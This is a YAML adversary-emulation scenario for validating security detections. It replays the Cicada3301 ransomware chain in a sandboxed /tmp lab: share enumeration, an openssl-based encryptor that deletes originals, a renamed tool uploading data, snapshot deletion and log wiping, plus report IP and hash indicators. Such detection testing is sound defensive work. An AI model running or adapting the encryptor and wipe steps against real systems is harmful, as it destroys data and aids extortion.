@@ -1,0 +1,474 @@
+# Repellent Scorpius / Cicada3301 (Unit 42, 2024-09-10): stolen-credential RDP access, share enumeration to
+# ProgramData\found_shares.txt, a Rust encryptor pushed over C$ by embedded PsExec (--no_impl --key), Rclone
+# exfil to 91.238.181.238, then VM stop, shadow-copy and event-log wipe, and ChaCha20 encryption (.kcr5umw,
+# RECOVER-<ext>-DATA.txt). Transposed onto a Linux host with ESXi-shaped paths under /tmp/cortexsim-mp031.
+# ENDPOINT (01, 02, 04, 06, 07; root under an interactive bash CGO): point at the causality view - the
+#   found_shares.txt write, the share-path locker run with --no_impl --key, the renamed rclone + rclone.conf,
+#   the mass vmx-process kill / snapshot + log wipe, and the .kcr5umw rename with the ransom note.
+# NETWORK (03, 05; synthetic NGFW records carrying this host's src_ip/src_host/src_user): WildFire threat
+#   logs name three report SHA-256s on the SMB transfer; the EAL upload names the report exfil IP.
+# Two legs, not three: no emitter can put this host's identity on the report's RDP logon (103.42.240.37),
+# so no identity leg is authored. Report IP/hashes appear only in EAL params; nothing is ever contacted.
+# Lab-only: every write, encryption and delete is guarded to /tmp/cortexsim-mp031; uploads reach $STAGE_HOST.
+scenario_id: SIM-MP-031
+name: "Repellent Scorpius Cicada3301 - Share Enum, PsExec Spread, Rclone Exfil, Hypervisor-Shaped Encryption (Unit 42)"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - BIOC
+  - ABIOC
+  - XQL
+  - IOC
+  - Correlation
+
+uc_ref: UCS-IR-02
+tc_ref: TC-IR-04
+tc_refs:
+  - TC-IR-04
+  - TC-IR-05
+  - TC-NDR-01
+  - TC-NDR-04
+pov_scenario_id: POV-SC-001
+uc_name: "Incident Response"
+tc_name: "Validate analytics detection rules trigger on simulated lateral movement patterns"
+
+mitre_tactic: "TA0040"
+mitre_tactic_name: "Impact"
+mitre_technique: "T1486"
+mitre_technique_name: "Data Encrypted for Impact"
+additional_techniques:
+  - technique: "T1078"
+    name: "Valid Accounts"
+  - technique: "T1135"
+    name: "Network Share Discovery"
+  - technique: "T1021.002"
+    name: "Remote Services: SMB/Windows Admin Shares"
+  - technique: "T1570"
+    name: "Lateral Tool Transfer"
+  - technique: "T1036.005"
+    name: "Masquerading: Match Legitimate Name or Location"
+  - technique: "T1567.002"
+    name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  - technique: "T1048"
+    name: "Exfiltration Over Alternative Protocol"
+  - technique: "T1489"
+    name: "Service Stop"
+  - technique: "T1490"
+    name: "Inhibit System Recovery"
+  - technique: "T1070.001"
+    name: "Indicator Removal: Clear Windows Event Logs"
+
+threat_report: "Unit 42 — Threat Assessment: Repellent Scorpius, Distributors of Cicada3301 Ransomware"
+threat_report_url: "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/"
+
+execution_identity:
+  default: root
+  options:
+    - root
+    - direct
+
+push_supported: false
+pull_supported: true
+
+infra_modules_needed:
+  - base
+  - edr
+  - ndr
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Multi-Plane Correlation & Behavioral Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "MTTD"
+threshold:
+  kpi: "MTTD"
+  op: "≤"
+  value: 900
+  unit: "seconds"
+success_criteria: |
+  On one lab Linux host, the endpoint stages (found_shares.txt after mount/share enumeration,
+  a locker binary copied onto a share path and run detached with --no_impl --key, a renamed
+  rclone with rclone.conf in a ProgramData-shaped directory, the mass kill of vmx-named
+  processes with snapshot and log wipe, and the ChaCha20 .kcr5umw encryption with
+  RECOVER-kcr5umw-DATA.txt) raise their XDR BIOCs; the NGFW threat log carries three report
+  sha256s and the NGFW EAL upload carries the report exfil IP, both naming the same src_host.
+  CR-MP-0031 stitches EDR + NDR into one incident within the window. Detection only; no
+  prevention outcome is claimed.
+moat_tier: "LEAD"
+
+correlation_window_seconds: 3600
+required_planes_in_incident:
+  - EDR
+  - NDR
+stitching_key: src_host
+
+indicators:
+  - id: ind-01
+    type: ipv4
+    value: "91.238.181.238"
+    source_url: "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/"
+    safe_form: log_field
+    surfaces_in: [step-05]
+    description: "Rclone exfiltration destination (report, Exfiltration and IoC sections); dst of the synthetic NGFW EAL upload in step-05, never contacted"
+  - id: ind-02
+    type: sha256
+    value: "8ec114b29c7f2406809337b6c68ab30b0b7f0d1647829d56125e84662b84ea74"
+    source_url: "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/"
+    safe_form: log_field
+    surfaces_in: [step-03]
+    description: "Cicada3301 encryptor (report IoC section); WildFire filedigest on the SMB copy of the locker in step-03"
+  - id: ind-03
+    type: sha256
+    value: "0260258f6f083aff71c7549a6364cb05d54dd27f40ca1145e064353dd2a9e983"
+    source_url: "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/"
+    safe_form: log_field
+    surfaces_in: [step-03]
+    description: "1.bat, the batch script that runs multiple encryptor commands (report IoC section); WildFire filedigest on the SMB copy of the launcher in step-03"
+  - id: ind-04
+    type: sha256
+    value: "2d73b3aefcfbb47c1a187ddee7a48a21af7c85eb49cbdcb665db07375e36dc33"
+    source_url: "https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/"
+    safe_form: log_field
+    surfaces_in: [step-03]
+    description: "Cicada3301 encryptor, second sample (report IoC section); WildFire filedigest on the second share-path copy in step-03"
+
+external_tools:
+  - name: cortexsim-eal-cli
+    source: "https://github.com/hankthebldr/cortex-pov-engine"
+    type: script
+    install_inline: false
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# The report's actor works hands-on-keyboard through a stolen-credential interactive session,
+# so the CGO is that session's shell. step-01 is the root; the share-path locker run, the
+# rclone staging and the hypervisor-stop stage descend from it (process_lineage); the two
+# NGFW legs are the same src_host seen by the firewall (shared_entity /
+# endpoint_network_stitch); the encryption closes the chain (exploit_impact) where
+# CR-MP-0031 fuses every leg on src_host.
+cgo_anchor:
+  image_name: "bash"
+  primary_username: "root"
+
+steps:
+  - id: step-01
+    name: "Share and datastore enumeration written to ProgramData/found_shares.txt"
+    command: |
+      LAB=/tmp/cortexsim-mp031
+      mkdir -p "$LAB/ProgramData" "$LAB/var/log"
+      for vm in vm-01 vm-02 vm-03; do
+        d="$LAB/vmfs/volumes/datastore1/$vm"
+        mkdir -p "$d"
+        head -c 65536 /dev/urandom > "$d/$vm-flat.vmdk"
+        printf 'displayName = "%s"\nguestOS = "other-64"\n' "$vm" > "$d/$vm.vmx"
+        head -c 4096 /dev/urandom > "$d/$vm-Snapshot1.vmsn"
+      done
+      for n in hostd vmkernel vpxa; do head -c 2048 /dev/urandom | base64 > "$LAB/var/log/$n.log"; done
+      out="$LAB/ProgramData/found_shares.txt"
+      { cat /proc/mounts; df -hP; find "$LAB/vmfs/volumes" -maxdepth 2 -type d; getent hosts "${STAGE_HOST:-127.0.0.1}"; } > "$out" 2>&1
+      wc -l "$out"
+    identity: root
+    mitre_technique: "T1135"
+    platforms: ["linux"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A shell enumerates mounts, filesystems and datastore directories and redirects the result into a file named found_shares.txt under a ProgramData-shaped path — the report's share-enumeration output file."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "bioc-mp-031-share-enumeration-output-written-to-found-shares-txt"
+
+  - id: step-02
+    name: "Lateral spread — locker and 1.sh copied onto the stage host's share path, run detached with --no_impl --key"
+    command: |
+      LAB=/tmp/cortexsim-mp031
+      PUB="$LAB/Users/Public"
+      SHARE="$LAB/mnt/${STAGE_HOST:-127.0.0.1}/C\$"
+      mkdir -p "$PUB" "$SHARE/Users/Public" "$SHARE/data"
+      cat > "$PUB/locker" <<'LOCKER'
+      #!/bin/sh
+      # cortexsim-mp031 Cicada3301-shaped encryptor stand-in: ChaCha20 over files under /tmp/cortexsim-* only
+      KEY=""; P=""; SLEEP=0
+      while [ $# -gt 0 ]; do
+        case "$1" in
+          --key) KEY="$2"; shift 2 ;;
+          -p|--path) P="$2"; shift 2 ;;
+          -s|--sleep) SLEEP="$2"; shift 2 ;;
+          *) shift ;;
+        esac
+      done
+      case "$P" in /tmp/cortexsim-*) ;; *) echo "refusing path outside /tmp/cortexsim-*: $P" >&2; exit 3 ;; esac
+      [ -n "$KEY" ] || exit 4
+      sleep "$SLEEP"
+      find "$P" -type f ! -name '*.kcr5umw' ! -name 'RECOVER-*' | while read -r f; do
+        openssl enc -chacha20 -pbkdf2 -pass "pass:$KEY" -in "$f" -out "$f.kcr5umw" 2>/dev/null \
+          || openssl enc -aes-256-ctr -pbkdf2 -pass "pass:$KEY" -in "$f" -out "$f.kcr5umw"
+        rm -f "$f"
+      done
+      printf 'cortexsim-mp031 lab ransom-note stand-in. Nothing was taken; files under %s were encrypted with a lab key.\n' "$P" > "$P/RECOVER-kcr5umw-DATA.txt"
+      LOCKER
+      printf '#!/bin/sh\n"%s/locker" --no_impl --key "${CICADA_LAB_KEY:-cortexsim-mp031-lab-key}" -p %s/vmfs/volumes\n' "$PUB" "$LAB" > "$PUB/1.sh"
+      chmod 0755 "$PUB/locker" "$PUB/1.sh"
+      cp "$PUB/locker" "$PUB/1.sh" "$SHARE/Users/Public/"
+      for i in 01 02 03 04 05; do head -c 8192 /dev/urandom > "$SHARE/data/finance-$i.xlsx"; done
+      setsid nohup "$SHARE/Users/Public/locker" --no_impl --key "${CICADA_LAB_KEY:-cortexsim-mp031-lab-key}" -s 1 -p "$SHARE/data" > /dev/null 2>&1 &
+      sleep 5
+      ls -l "$SHARE/data"
+    identity: root
+    mitre_technique: "T1570"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "An executable is written into a Users/Public directory on a C$-shaped share path and launched detached (setsid/nohup) with the encryptor's --no_impl --key arguments — the report's embedded-PsExec '-s -d locker --no_impl --key' spread."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "bioc-mp-031-encryptor-copied-to-admin-share-path-and-run-detached-with-no-impl-key"
+      - plane: EDR
+        type: BIOC
+        description: "The detached locker process reads files on the share path, writes .kcr5umw copies and deletes the originals, then drops RECOVER-kcr5umw-DATA.txt — encryption on the lateral target."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "bioc-mp-031-files-rewritten-with-kcr5umw-extension-and-recover-data-note-dropped"
+
+  - id: step-03
+    name: "NGFW threat log — WildFire malicious verdicts on the SMB-copied encryptor and 1.bat (report sha256s)"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/threat/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un)
+      cat > /tmp/mp-031-threat.yml <<YML
+      campaign_id: CMP-MP-031-THREAT
+      name: "MP-031 — WildFire verdicts on the Cicada3301 SMB transfer"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [mp-031, unit42, ngfw-threat]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "8ec114b29c7f2406809337b6c68ab30b0b7f0d1647829d56125e84662b84ea74"
+            file_name: "locker.exe"
+            file_type: "PE"
+            verdict: malicious
+            app: "ms-ds-smb"
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-02
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "0260258f6f083aff71c7549a6364cb05d54dd27f40ca1145e064353dd2a9e983"
+            file_name: "1.bat"
+            file_type: "BAT"
+            verdict: malicious
+            app: "ms-ds-smb"
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-03
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "2d73b3aefcfbb47c1a187ddee7a48a21af7c85eb49cbdcb665db07375e36dc33"
+            file_name: "locker.exe"
+            file_type: "PE"
+            verdict: malicious
+            app: "ms-ds-smb"
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-031-threat.yml --live
+    identity: direct
+    mitre_technique: "T1570"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-02
+      pivot: shared_entity
+    expected_detections:
+      - plane: NDR
+        type: IOC
+        description: "WildFire malicious-verdict threat log whose filedigest is the report's Cicada3301 encryptor sha256, on this src_host — enriches the case as Repellent Scorpius."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "ioc-file-sha256-8ec114b29c7f2406809337b6c68ab30b0b7f0d1647829d56125e84662b84ea74"
+      - plane: NDR
+        type: IOC
+        description: "WildFire malicious-verdict threat log whose filedigest is the report's 1.bat sha256, from the same src_host."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "ioc-file-sha256-0260258f6f083aff71c7549a6364cb05d54dd27f40ca1145e064353dd2a9e983"
+      - plane: NDR
+        type: IOC
+        description: "Second report encryptor sha256 on a WildFire malicious-verdict threat log from the same src_host."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "ioc-file-sha256-2d73b3aefcfbb47c1a187ddee7a48a21af7c85eb49cbdcb665db07375e36dc33"
+      - plane: NDR
+        type: XQL
+        description: "Validation: the three verdict records landed in panw_ngfw_threat_raw with endpoint_device_name = this host."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "xql-mp-031-wildfire-verdicts-for-cicada3301-hashes-landed-in-panw-ngfw-threat-raw"
+
+  - id: step-04
+    name: "Rclone staged as ProgramData/rclone with rclone.conf, uploading found_shares.txt to the lab stage host"
+    command: |
+      LAB=/tmp/cortexsim-mp031
+      PD="$LAB/ProgramData"
+      cp "$(command -v curl)" "$PD/rclone"
+      chmod 0755 "$PD/rclone"
+      printf '[cortexsim-mp031]\ntype = webdav\nurl = http://%s:%s/cortexsim-mp031/\nvendor = other\n' "${STAGE_HOST:-127.0.0.1}" "${STAGE_PORT:-8080}" > "$PD/rclone.conf"
+      tar -czf "$PD/stage-01.tgz" -C "$LAB" ProgramData/found_shares.txt vmfs/volumes/datastore1/vm-01/vm-01.vmx
+      "$PD/rclone" -sS -m 5 -A "rclone/v1.66.0" -T "$PD/stage-01.tgz" "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/cortexsim-mp031/stage-01.tgz" || true
+      ls -l "$PD"
+    identity: root
+    mitre_technique: "T1567.002"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A binary named rclone whose original image is a different tool (renamed curl) runs from a ProgramData-shaped directory next to rclone.conf and uploads an archive of the share-enumeration output — the report's C:\\ProgramData\\rclone.exe + rclone.conf staging."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "bioc-mp-031-renamed-binary-run-as-rclone-from-programdata-with-rclone-conf"
+
+  - id: step-05
+    name: "Exfil as the NGFW sees it — massive upload from this host to the report's Rclone destination IP"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un)
+      cat > /tmp/mp-031-exfil.yml <<YML
+      campaign_id: CMP-MP-031-EXFIL
+      name: "MP-031 — Rclone bulk upload to the report exfil IP"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [mp-031, unit42, rclone-exfil]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: massive_upload_rare_domain
+            iterations: 1
+            dst_domain: "91.238.181.238"
+            dst_ip: "91.238.181.238"
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-031-exfil.yml --live
+    identity: direct
+    mitre_technique: "T1048"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-04
+      pivot: endpoint_network_stitch
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "A single session from this src_host uploads tens of GB to a destination the fleet has never used, with process rclone.exe on the EAL record — the report's Rclone exfiltration as NGFW analytics sees it."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "abioc-mp-031-rclone-massive-upload-to-rare-external-destination"
+      - plane: NDR
+        type: IOC
+        description: "dst is the report's Rclone exfiltration IP — enriches the case as Repellent Scorpius."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "ioc-ipv4-91-238-181-238"
+      - plane: NDR
+        type: XQL
+        description: "Validation: the upload record to the report IP carries this host's endpoint_device_name, src and user."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "xql-mp-031-upload-to-report-exfil-ip-stitched-to-the-endpoint-host"
+
+  - id: step-06
+    name: "Pre-encryption — mass stop of vmx-named VM processes, snapshot deletion and hypervisor log wipe (lab datastore only)"
+    command: |
+      LAB=/tmp/cortexsim-mp031
+      DS="$LAB/vmfs/volumes/datastore1"
+      for vmx in "$DS"/*/*.vmx; do
+        ( exec -a "vmx-cortexsim-mp031 $vmx" sleep 600 ) &
+      done
+      sleep 2
+      pgrep -af 'vmx-cortexsim-mp031' | wc -l
+      pkill -KILL -f 'vmx-cortexsim-mp031'
+      find "$DS" -type f -name '*.vmsn' -print -delete
+      for f in "$LAB"/var/log/*.log; do : > "$f"; done
+      ls -l "$LAB/var/log"
+    identity: root
+    mitre_technique: "T1490"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-04
+      pivot: shared_entity
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "One shell kills every VM-worker-shaped (vmx) process in one pkill — the Linux/hypervisor rendering of the report's 'Get-VM | Stop-VM -Force' stop-all-VMs command before encryption."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "bioc-mp-031-mass-kill-of-vmx-named-virtual-machine-processes"
+      - plane: EDR
+        type: BIOC
+        description: "The same chain deletes VM snapshot files (*.vmsn) under a vmfs/volumes path and truncates hostd/vmkernel/vpxa logs — the report's shadow-copy deletion and event-log clearing, scoped to the lab datastore."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "bioc-mp-031-vm-snapshot-deletion-and-hypervisor-log-truncation"
+
+  - id: step-07
+    name: "Impact — 1.sh runs the locker over the datastore, .kcr5umw encryption and RECOVER-kcr5umw-DATA.txt; the stitched incident"
+    command: |
+      LAB=/tmp/cortexsim-mp031
+      sh "$LAB/Users/Public/1.sh"
+      find "$LAB/vmfs/volumes" -type f -name '*.kcr5umw' | wc -l
+      head -c 200 "$LAB/vmfs/volumes/RECOVER-kcr5umw-DATA.txt"
+    identity: root
+    mitre_technique: "T1486"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-06
+      pivot: exploit_impact
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A script launches the locker with --no_impl --key -p <vmfs/volumes path>, which rewrites every .vmdk/.vmx as .kcr5umw, deletes the originals and drops RECOVER-kcr5umw-DATA.txt — the Cicada3301 encryption and note on a hypervisor-shaped datastore."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "bioc-mp-031-locker-encrypts-vmfs-datastore-files-to-kcr5umw-with-ransom-note"
+      - plane: ANALYTICS
+        type: Correlation
+        description: "CR-MP-0031 fuses found_shares.txt, the share-path locker run, the report-hash WildFire verdicts, the rclone staging and the upload to the report exfil IP, the VM-stop/wipe stage and the datastore encryption into one incident on src_host within the window."
+        ttp_ref: "TTP-2026-0190"
+        detection_id: "CR-MP-0031"
+
+cleanup:
+  commands:
+    - "pkill -KILL -f 'vmx-cortexsim-mp031' || true"
+    - "rm -rf /tmp/cortexsim-mp031"
+    - "rm -f /tmp/mp-031-threat.yml /tmp/mp-031-exfil.yml"
+
+author: "Henry Reed"
+created: "2026-10-27"
+last_updated: "2026-10-27"
+tags:
+  - unit42
+  - stitched-chain
+  - actor:repellent-scorpius
+  - cicada3301
+  - ransomware
+  - rclone
+  - psexec
+  - hypervisor-shaped
+  - linux
